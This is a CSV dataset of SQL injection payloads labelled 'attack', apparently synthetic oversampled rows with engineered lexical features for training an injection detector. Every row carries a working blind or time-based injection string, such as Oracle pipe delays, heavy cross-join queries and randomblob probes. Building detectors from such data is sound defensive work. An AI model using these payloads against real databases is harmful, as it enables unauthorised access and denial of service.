id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000059,attack,boolean,"1%'   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000021,1.9524201329926079,138.47438021813952,32.0929752726744,3.715936729841827,38.14421483639536,15.38140494546512,56.948760436279045,28.0,0.27566376097816114,0.11114921161202856,0.4109434689070743,0.202243558502736,2.144214836395359,-1.1102230246251565e-16,1.2371901090697608,0.0,0.0,1.3814049454651196,0.0,11.85578516360464,1.3814049454651196,2.0,1.0,8.61859505453488,1.0,0.0,0.6185950545348803,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.3814049454651196,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3814049454651196
SMOTE_000060,attack,boolean,"1%""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,0.4401216932982554,136.44339236910656,34.0,3.713062501073104,37.0,15.0,57.15471389528525,27.288678473821314,0.2712483853091565,0.10996556161182018,0.41878605307902333,0.2,0.0,1.0,2.0,0.0,0.0,1.0,0.0,12.288678473821312,1.0,2.0,1.0,9.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000061,attack,boolean,"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000108,0.2561570096291569,135.60544256733002,26.098639358167496,3.759009914673487,62.0,10.0,43.605442567330016,20.0,0.45724501787129784,0.0737491964308545,0.3215073928361387,0.147498392861709,0.0,0.09863935816749603,2.0,0.0,1.0,1.0,0.0,6.901360641832504,0.0,5.0,4.0,4.0,0.0,0.09863935816749603,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000062,attack,boolean,"1'||  (  select 'iocs' where 9287  =  9287 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000043,0.06969169218260086,138.8811440557878,34.03961864807074,3.951211279892157,47.0,21.0,49.920762703858514,20.960381351929257,0.33843166708378725,0.15121414912254325,0.35943791924308677,0.15091626455058277,3.9801906759646286,-1.1102230246251565e-16,0.039618648070742224,0.0,1.0,2.0,0.0,7.980190675964629,0.0,1.0,1.0,7.0,1.0,0.0,0.019809324035371167,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000063,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000226,0.016916339371866516,134.94502812231542,30.0,3.9080570228741434,65.0,8.0,44.95602249785233,16.989005624463083,0.4816850810284614,0.05928431766504141,0.3331359983877989,0.12589460291869822,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.989005624463083,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000064,attack,boolean,"1'   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000066,0.02354193235842366,134.05938648319585,33.00989774719931,3.696617276517549,37.0,15.0,56.03959098879724,26.01979549439862,0.27600227612589306,0.11189281464563232,0.41801596745415043,0.19408894177432423,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,12.009897747199307,0.009897747199308637,2.0,1.0,9.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000065,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R000196,0.27220886402322525,131.0,27.735536538009036,3.2075101496288942,34.0,13.0,66.0,18.0,0.2595419847328244,0.09923664122137404,0.5038167938931297,0.13740458015267176,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,-2.220446049250313e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000066,attack,boolean,"1%'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000173,0.2516865000053898,140.09519343659727,30.0,3.983679836201921,67.09519343659727,8.0,45.0,20.0,0.47892346103706185,0.05710427824251377,0.32121156511414,0.14276069560628443,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0951934365972678,0.9048065634027322,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000067,attack,boolean,1%'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000202,1.01893613844943,137.74815809467623,27.65036838106475,3.1341129086582162,34.0,13.0,71.398526475741,19.349631618935245,0.24712049292301488,0.09448724729409393,0.5179919080760889,0.1404003517068023,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,11.349631618935245,2.0,0.0,-2.220446049250313e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000068,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",nearest_attack_euclidean,R000162,1.009125502581105,133.20587633204528,27.73529211068176,3.939996577858435,71.73529211068175,6.225486851136261,36.0,19.245097370227253,0.5386971672259594,0.04632003248847459,0.2704791958585807,0.14450360442698526,0.0,3.245097370227252,0.0,0.0,1.0,1.2450973702272525,0.0,4.754902629772747,0.0,5.0,4.0,2.2450973702272528,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.2450973702272523,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2450973702272523
SMOTE_000069,attack,boolean,"1%""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000179,0.5816666587013739,134.16834936669676,27.70791265832581,3.8489613139992747,62.0,10.0,41.16834936669675,21.0,0.4621899094047967,0.07454675958141882,0.3067151358928049,0.15654819512097953,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.292087341674189,0.7079126583258111,5.0,4.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000070,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,nearest_attack_euclidean,R000017,0.8677144024860171,137.55276866599408,28.0,3.362854861710785,44.21107466397635,13.0,64.89446266801183,15.447231334005913,0.32136363826261544,0.0945104203608419,0.47181099405278804,0.11231494732375462,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.4472313340059142,0.0,10.0,0.0,0.0,-2.220446049250313e-16,1.447231334005914,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000071,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""vkqt""  =  ""vkqt",nearest_attack_euclidean,R000076,1.286384383791162,133.6799806660226,34.300048334943476,3.762241469891252,43.699951665056524,15.0,55.32001933397739,19.660009666988696,0.32679111019100904,0.11221388415536958,0.4138949403576567,0.1471000652959646,2.0,3.999999999999999,0.0,1.0,0.0,1.6600096669886955,0.0,10.0,0.0,0.0,1.0,2.660009666988695,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,1.3399903330113045,0.6600096669886955,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000072,attack,boolean,"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000172,0.8159921745095404,136.1447472029135,30.427626398543257,4.1022441586992295,76.78618680072837,8.213813199271629,37.144747202913486,14.0,0.5640503845604219,0.06037728064743456,0.2727254252284965,0.10284690956364695,0.7861868007283717,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.786186800728371,0.0,0.0,2.213813199271628,2.0,0.7861868007283718,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.21381319927162823,0.7861868007283719,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000073,attack,boolean,"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cssb'  =  'cssb",nearest_attack_euclidean,R000208,2.0834964829902054,133.6974662549553,30.39493250991057,3.6168796263254657,45.117736215313,13.487331274776428,55.69746625495529,19.39493250991057,0.3375482888502337,0.1008214789022395,0.41658637458683156,0.14504385766069525,5.697466254955287,-1.1102230246251565e-16,0.0,1.0,0.0,1.3949325099105716,0.0,10.302533745044714,0.0,0.0,1.0,2.3949325099105714,1.0,0.0,0.0,0.0,0.0,0.6974662549552858,1.0,0.0,0.0,0.0,0.0,0.3025337450447141,0.0,2.7755575615628914e-17,0.0,1.6974662549552857,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000074,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000026,1.0365120993194143,132.56706173113773,31.0,3.5871526602703057,45.14940740329343,11.417654327844287,56.716469134431144,19.283530865568856,0.3406624229761645,0.0860164944574892,0.42787490994290256,0.14544617262344373,5.283530865568858,-1.1102230246251565e-16,0.0,1.0,0.0,1.2835308655688575,0.0,10.716469134431144,0.0,0.0,1.0,2.2835308655688578,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7164691344311424,0.0,2.7755575615628914e-17,0.0,1.2835308655688578,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000075,attack,boolean,"1' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000063,0.5908109674810249,130.37278013775835,32.372780137758355,4.283265269220109,72.0,9.0,33.0,16.372780137758355,0.5522701015902172,0.06903376269877715,0.25312379656218287,0.1255723391488228,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.0,0.372780137758353,0.0,3.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000076,attack,boolean,"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cssb'  =  'cssb",nearest_attack_euclidean,R000208,1.634209896049322,133.10517652574677,31.105176525746764,3.614181702563698,44.34223521137985,12.762941314366913,56.447411737126615,19.552588262873382,0.3332393107031767,0.095751723667965,0.42413293121512596,0.14687603441373237,5.552588262873384,-1.1102230246251565e-16,0.0,1.0,0.0,1.5525882628733827,0.0,10.447411737126618,0.0,0.0,1.0,2.5525882628733827,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.4474117371266174,0.0,2.7755575615628914e-17,0.0,1.5525882628733827,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000077,attack,boolean,"1""  )   where 7957  =  7957 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000224,0.0203676316258301,130.0,35.0,3.8274808338092243,37.0,23.0,52.0,18.0,0.2846153846153846,0.17692307692307693,0.4,0.13846153846153847,2.0,1.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000078,attack,boolean,"1 where 2674  =  2674 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000071,0.13145349973198703,137.42271544684365,33.0,4.25177518116538,70.0,16.0,37.33817235747492,14.08454308936873,0.509427876977534,0.11644065759486488,0.27165051616330055,0.10248094926430065,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.08454308936873,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000079,attack,boolean,"1%'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000167,0.4604097582897961,137.21801186950526,31.0,3.933193490977687,69.26304154326841,8.0,42.56397626098948,17.39099406524737,0.5046143903648052,0.058304342766621796,0.31030958212738874,0.12677168474118433,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.390994065247369,1.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000080,attack,boolean,"1   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000223,0.8572315227234315,138.3731754793651,32.373175479365095,3.6072329688221227,37.0,15.0,60.0,26.3731754793651,0.2673961269556611,0.10840383525229504,0.4336153410091802,0.1905846967828637,0.0,0.3731754793650972,2.0,0.0,0.0,1.0,0.0,13.0,0.0,2.0,1.0,9.0,0.0,0.37317547936509726,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000081,attack,boolean,"1' in boolean mode  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000231,0.35617783752220555,140.68553160796262,30.0,4.035944902355022,73.74212643185052,10.0,37.73375958142053,19.20964559469158,0.524011972263014,0.07108359974922263,0.2683264174882145,0.13657801049954893,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.2096455946915805,0.0,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.10482279734579025,0.8951772026542097,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000082,attack,boolean,"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000113,0.0693034994444762,137.96984523772878,29.969845237728777,3.8656534805766034,63.0,10.0,44.0,20.969845237728777,0.45662222310499767,0.07247971795317425,0.31891075899396665,0.15198729994786137,0.0,0.9698452377287778,2.0,0.0,1.0,1.0,0.0,7.0,0.0,5.0,4.0,4.0,0.0,0.9698452377287777,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000083,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R000196,0.27409616178671553,131.0,27.74063621199701,3.207602700682751,34.0,13.0,66.0,18.0,0.2595419847328244,0.09923664122137404,0.5038167938931297,0.13740458015267176,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,-2.220446049250313e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000084,attack,boolean,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lqpd'  =  'lqpd",nearest_attack_euclidean,R000247,0.5210470574707955,135.19710737678972,31.0,3.5259428050070825,42.19710737678972,13.0,61.0,19.0,0.31210953083014403,0.09615673224954976,0.4511969744017335,0.14053676251857275,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,10.0,0.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.1971073767897187,0.8028926232102813,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000085,attack,boolean,"1"" where 5845  =  5845 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000153,1.1217106806031991,140.57611812115888,31.15223624231775,4.106074768885151,67.57611812115887,18.0,36.0,19.0,0.4807019565777405,0.1280460928986393,0.25609218579727866,0.1351597647263415,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.0,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.5761181211588746,0.4238818788411253,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000086,attack,boolean,1%'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',nearest_attack_euclidean,R000048,1.050384526455305,139.11495957447704,33.53858297872085,4.1163440196755685,55.73070851063957,15.807874468081273,44.8456680851166,22.730708510639573,0.4007405612273456,0.11390843158581053,0.3219453847782905,0.16340562240855344,8.0,-1.1102230246251565e-16,0.2692914893604247,0.0,0.0,2.0,0.0,5.461417021279151,2.0,0.0,-2.220446049250313e-16,6.269291489360425,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,1.7307085106395754,0.2692914893604247,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000087,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'tfso'  =  'tfso",nearest_attack_euclidean,R000150,1.2402458943349892,138.2975597134904,29.3243899283726,4.027705117252983,73.40488057301921,8.0,39.595119426980794,17.297559713490397,0.531234358351626,0.05785678533375145,0.2859927344876132,0.12491612182700927,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,4.648779856745199,0.6487798567451981,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
